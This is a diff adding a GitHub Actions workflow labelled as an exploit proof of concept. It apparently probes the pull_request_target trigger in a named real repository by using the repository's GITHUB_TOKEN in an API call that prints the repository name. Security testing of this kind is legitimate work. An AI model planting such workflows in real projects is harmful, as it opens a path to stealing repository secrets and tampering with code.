@@ -1,0 +1,15 @@
+name: Base Repo PoC
+on:
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Prove Base Repo Context
+      run: |
+        echo "REPOSITORY: $GITHUB_REPOSITORY"
+        echo "This should show: MercuryTechnologies/nix-your-shell"
+        curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          "https://api.github.com/repos/$GITHUB_REPOSITORY" | jq '.full_name'
